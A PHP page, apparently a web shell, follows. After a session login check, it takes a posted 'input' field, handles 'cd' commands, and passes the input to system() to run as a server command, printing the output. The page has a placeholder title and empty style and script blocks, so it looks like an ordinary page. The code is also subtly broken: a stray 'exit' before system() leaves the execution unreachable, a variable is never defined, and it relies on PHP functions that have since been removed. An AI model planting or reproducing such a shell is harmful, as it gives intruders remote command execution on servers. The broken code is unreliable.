<?php
ignore_user_abort(1);
ini_set("session.name","sid"); 

$session_name=session_name();
if (isset($_COOKIE[$session_name])) 
   {
    ini_set("session.use_trans_sid","0");
    $cookies=1;
   }
else 
   {
    ini_set("session.use_trans_sid","1");
    $cookies=0;
   }
if (eregi("opera 3.60",@$_SERVER["HTTP_USER_AGENT"])) {$opera360=1;} else {$opera360=0;}
session_start();

if (!isset($_SESSION["username"])) {header("Location: ../../../");  exit;}
$remote_ID=$_SERVER["REMOTE_ADDR"]."&u=".@$_POST["username"]."&p=".@$_SERVER["HTTP_X_FORWARDED_FOR"];
if ($_SESSION["IP"] == $remote_ID) {header("Location: ../../../"); exit;}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
<title>title</title>
<meta http-equiv="content-type" content="text/html; charset=windows-1251">
<style><!--

--></style>
<script language=JavaScript><!--

//--></script>
</head>
<body leftmargin="10" topmargin="10" marginwidth="10" marginheight="10">
<?php 

if (isset($_POST["input"]))
   {
    $input=$_POST["input"];
    if (get_magic_quotes_gpc())
       {
      echo $input=stripslashes($input);
       }
echo("cwd is ".getcwd());
    if (eregi("cd (.+)",$input,$data)) {chdir($data[1]);}
echo("cwd is ".getcwd()); exit;
    system("$input");
    $output="";
    foreach($arr as $key=>$value)
       {
        $output.=$value."\r\n";
       }
    $output_2=htmlspecialchars($output);
    echo("<pre>");
    echo $output_2;
    echo("</pre>");
   }
?>
</body>
</html>